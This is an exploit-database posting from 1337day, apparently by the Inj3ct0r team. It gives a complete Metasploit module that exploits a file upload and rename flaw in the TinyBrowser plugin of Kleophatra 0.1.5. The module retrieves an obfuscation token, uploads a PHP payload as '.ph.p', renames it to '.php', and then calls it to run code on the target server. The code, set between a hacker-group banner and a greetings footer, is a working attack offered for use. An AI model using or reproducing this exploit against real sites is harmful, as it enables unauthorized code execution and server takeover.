0     _                   __           __       __                     1
1   /&#039; \            __  /&#039;__`\        /\ \__  /&#039;__`\                   0
0  /\_, \    ___   /\_\/\_\ \ \    ___\ \ ,_\/\ \/\ \  _ ___           1
1  \/_/\ \ /&#039; _ `\ \/\ \/_/_\_<_  /&#039;___\ \ \/\ \ \ \ \/\`&#039;__\          0
0     \ \ \/\ \/\ \ \ \ \/\ \ \ \/\ \__/\ \ \_\ \ \_\ \ \ \/           1
1      \ \_\ \_\ \_\_\ \ \ \____/\ \____\\ \__\\ \____/\ \_\           0
0       \/_/\/_/\/_/\ \_\ \/___/  \/____/ \/__/ \/___/  \/_/           1
1                  \ \____/ >> Exploit database separated by exploit   0
0                   \/___/          type (local, remote, DoS, etc.)    1
1                                                                      1
0  [+] Site            : 1337day.com                                   0
1  [+] Support e-mail  : submit[at]1337day.com                         1
0                                                                      0
1               #########################################              1
0               I&#039;m KedAns-Dz member from Inj3ct0r Team                1
1               #########################################              0
0-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-==-=-=-1

###
# Title : Kleophatra v0.1.5 &#039;TinyBrowser&#039; File Upload Code Execution (meta)
# Author : KedAns-Dz
# E-mail : ked-h@hotmail.com (ked-h@1337day.com) | ked-h@exploit-id.com
# Home : HMD/AM (30008/04300) - Algeria -(00213555248701)
# Web Site : www.1337day.com * www.exploit-id.com
# Twitter page : twitter.com/kedans
# platform : php
# Impact : File Upload Code Execution (via MetaSploit3)
# Tested on : [Windows XP sp3 FR]
##
# Download :[http://releases.kleophatra.org/stables/0.1.5/kleophatra-0.1.5.zip]
##
# $Id: kleo_tinybrowser.rb | 2011-06-02 22:55  | KedAns-Dz $
###

require &#039;msf/core&#039;

class Metasploit3 < Msf::Exploit::Remote
	Rank = ExcellentRanking

	include Msf::Exploit::Remote::HttpClient

	def initialize(info = {})
		super(update_info(info,
		   &#039;Name&#039;           => &#039;Kleophatra <=0.1.5 TinyBrowser File Upload Code Execution&#039;,
		   &#039;Description&#039;    => %q{
		   This module exploits a vulnerability in the TinyMCE/tinybrowser plugin.
		  By renaming the uploaded file this vulnerability can be used to upload/execute
		  code on the affected system.
		   },
		   &#039;Author&#039;         => [ &#039;KedAns-Dz <ked-h[at]1337day.com>&#039; ],
		   &#039;License&#039;        => MSF_LICENSE,
		   &#039;Version&#039;        => &#039;1.0&#039;,
		   &#039;References&#039;     =>
		   	[
			   [&#039;URL&#039;, &#039;Not Olden !&#039;],
		    ],
		   &#039;Privileged&#039;     => false,
		   &#039;Payload&#039;        =>
			   {
			    &#039;DisableNops&#039; => true,
			    &#039;Compat&#039;      =>
				    {
					    &#039;ConnectionType&#039; => &#039;find&#039;,
				    },
			    &#039;Space&#039;       => 1024,
			    },
		   &#039;Platform&#039;       => &#039;php&#039;,
		   &#039;Arch&#039;           => ARCH_PHP,
		   &#039;Targets&#039;        => [[ &#039;Automatic&#039;, { }]],
		   &#039;DisclosureDate&#039; => &#039;08/05/2011&#039;,
		   &#039;DefaultTarget&#039;  => 0))

		   register_options(
		       [
		   	      OptString.new(&#039;URI&#039;, [true, "Kleophatra directory path", "/"]),
			    ], self.class)
	end

	def check
		uri = &#039;&#039;
		uri << datastore[&#039;URI&#039;]
		uri << &#039;/&#039; if uri[-1,1] != &#039;/&#039;
		uri << &#039;lib/third_party/tiny_mce/plugins/tinybrowser/upload.php?type=file&folder=&#039;
		res = send_request_raw(
			{
				&#039;uri&#039; => uri
			}, 25)

		if (res and res.body =~ /flexupload.swf/)
			return Exploit::CheckCode::Vulnerable
		end

		return Exploit::CheckCode::Safe
	end


	def retrieve_obfuscation()

	end


	def exploit

		cmd_php = &#039;<?php &#039; + payload.encoded + &#039;?>&#039;

		# Generate some random strings
		cmdscript	= rand_text_alpha_lower(20)
		boundary    = rand_text_alphanumeric(6)

		# Static files
		directory 	= &#039;/media/uploads/photos&#039;
		uri_base    = &#039;&#039;
		uri_base << datastore[&#039;URI&#039;]
		uri_base << &#039;/&#039; if uri_base[-1,1] != &#039;/&#039;
		uri_base << &#039;lib/third_party/tiny_mce/plugins/tinybrowser&#039;

		# Get obfuscation code (needed to upload files)
		obfuscation_code = nil

		res = send_request_raw({
			&#039;uri&#039;     => uri_base + &#039;/upload.php?type=file&folder=&#039;
		}, 25)

		if (res)

			if(res.body =~ /"obfus", "((\w)+)"\)/)
				obfuscation_code = $1
				print_status("Successfully retrieved obfuscation code: #{obfuscation_code}")
			else
				print_error("Error retrieving obfuscation code!")
				return
			end
		end



		# Upload shellcode (file ending .ph.p)
		data = "--#{boundary}\r\nContent-Disposition: form-data; name=\"Filename\"\r\n\r\n"
		data << "#{cmdscript}.ph.p\r\n--#{boundary}"
		data << "\r\nContent-Disposition: form-data; name=\"Filedata\"; filename=\"#{cmdscript}.ph.p\"\r\n"
		data << "Content-Type: application/octet-stream\r\n\r\n"
		data << cmd_php
		data << "\r\n--#{boundary}--"

		res = send_request_raw({
			&#039;uri&#039;	  => uri_base + "/upload_file.php?folder=" + directory + "&type=file&feid=&obfuscate=#{obfuscation_code}&sessidpass=",
			&#039;method&#039;  => &#039;POST&#039;,
			&#039;data&#039;    => data,
			&#039;headers&#039; =>
			{
				&#039;Content-Length&#039; => data.length,
				&#039;Content-Type&#039;	 => &#039;multipart/form-data; boundary=&#039; + boundary,
			}
		}, 25)

		if (res and res.body =~ /File Upload Success/)
			print_status("Successfully uploaded #{cmdscript}.ph.p")
		else
			print_error("Error uploading #{cmdscript}.ph.p")
		end


		# Complete the upload process (rename file)
		print_status("Renaming file from #{cmdscript}.ph.p_ to #{cmdscript}.ph.p")
		res = send_request_raw({
			&#039;uri&#039;     => uri_base + &#039;/upload_process.php?folder=&#039; + directory + &#039;&type=file&feid=&filetotal=1&#039;
		})


		# Rename the file from .ph.p to .php
		res = send_request_cgi(
			{
				&#039;method&#039;    => &#039;POST&#039;,
				&#039;uri&#039;       => uri_base + &#039;/edit.php?type=file&folder=&#039;,
				&#039;vars_post&#039; =>
				{
					&#039;actionfile[0]&#039; => "#{cmdscript}.ph.p",
					&#039;renameext[0]&#039;   => &#039;p&#039;,
					&#039;renamefile[0]&#039; => "#{cmdscript}.ph",
					&#039;sortby&#039; => &#039;name&#039;,
					&#039;sorttype&#039; => &#039;asc&#039;,
					&#039;showpage&#039; => &#039;0&#039;,
					&#039;action&#039; => &#039;rename&#039;,
					&#039;commit&#039; => &#039;&#039;,
				}
			}, 10)

		if (res and res.body =~ /successfully renamed./)
			print_status ("Renamed #{cmdscript}.ph.p to #{cmdscript}.php")
		else
			print_error("Failed to rename #{cmdscript}.ph.p to #{cmdscript}.php")
		end


		# Finally call the payload
		print_status("Calling payload: #{cmdscript}.php")
		uri = &#039;&#039;
		uri << datastore[&#039;URI&#039;]
		uri << &#039;/&#039; if uri[-1,1] != &#039;/&#039;
		uri << directory + cmdscript + ".php"
		res = send_request_raw({
			&#039;uri&#039;	=> uri
		}, 25)

	end

end

#================[ Exploited By KedAns-Dz * HST-Dz * ]===========================================  
# Greets To : [D] HaCkerS-StreeT-Team [Z] < Algerians HaCkerS > Islampard + Z4k1-X-EnG + Dr.Ride
# + Greets To Inj3ct0r Operators Team : r0073r * Sid3^effectS * r4dc0re (www.1337day.com) 
# Inj3ct0r Members 31337 : Indoushka * KnocKout * eXeSoul * eidelweiss * SeeMe * XroGuE * ZoRLu
# gunslinger_ * Sn!pEr.S!Te * anT!-Tr0J4n * ^Xecuti0N3r &#039;www.1337day.com/team&#039; ++ .... * Str0ke
# Exploit-ID Team : jos_ali_joe + Caddy-Dz + kaMtiEz + r3m1ck (exploit-id.com) * TreX (hotturks.org)
# JaGo-Dz (sec4ever.com) * Kalashnikov3 * PaCketStorm Team (www.packetstormsecurity.org)
# www.metasploit.com * UE-Team (www.09exploit.com) * All Security and Exploits Webs ...
# -+-+-+-+-+-+-+-+-+-+-+-+={ Greetings to Friendly Teams : }=+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-
# (D) HaCkerS-StreeT-Team (Z) | Inj3ct0r | Exploit-ID | UE-Team | PaCket.Storm.Sec TM | Sec4Ever 
# h4x0re-Sec | Dz-Ghost | INDONESIAN CODER | HotTurks | IndiShell | D.N.A | DZ Team | Milw0rm
# Indian Cyber Army | MetaSploit | BaCk-TraCk | AutoSec.Tools | HighTech.Bridge SA | Team DoS-Dz
#================================================================================================



